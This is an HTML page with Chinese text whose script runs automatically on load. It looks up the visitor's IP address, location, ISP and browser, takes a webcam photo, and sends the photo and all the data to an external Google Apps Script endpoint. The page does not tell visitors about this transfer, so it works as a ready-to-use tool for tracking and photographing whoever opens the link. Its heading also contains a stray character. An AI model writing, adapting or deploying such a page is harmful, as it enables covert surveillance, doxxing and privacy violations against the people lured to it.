<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP 定位與照片記錄</title>
</head>
<body>
  <h1>自動拍攝照片並記錄資ㄎ訊</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">尚未開始操作</p>

  <script>
    // 獲取 IP 和地理位置信息
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;

        // 發送 IP 資訊到後端
        const photoBlob = await takePhoto();
        const photoBase64 = await blobToBase64(photoBlob);
        const url = new URL('https://script.google.com/macros/s/AKfycbxTnG9sQ7PWVRAT6t2WG5vf3Bbx0gZvF5eG8fS_Ymt91ip5e0jdwbamsZdnw1eBg_gmiA/exec');
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);
        url.searchParams.append('photo', photoBase64);

        const result = await fetch(url.toString());
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = '上傳成功！';
        } else {
          document.getElementById('status').innerText = '上傳失敗，請檢查後端日誌。';
        }
      } catch (error) {
        console.error('錯誤:', error);
        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 拍攝照片
    async function takePhoto() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      const photoBlob = await imageCapture.takePhoto();
      videoTrack.stop();
      return photoBlob;
    }

    // Blob 轉為 Base64
    function blobToBase64(blob) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
      });
    }

    // 開始執行
    document.addEventListener('DOMContentLoaded', () => getIpInfo());
  </script>
</body>
</html>
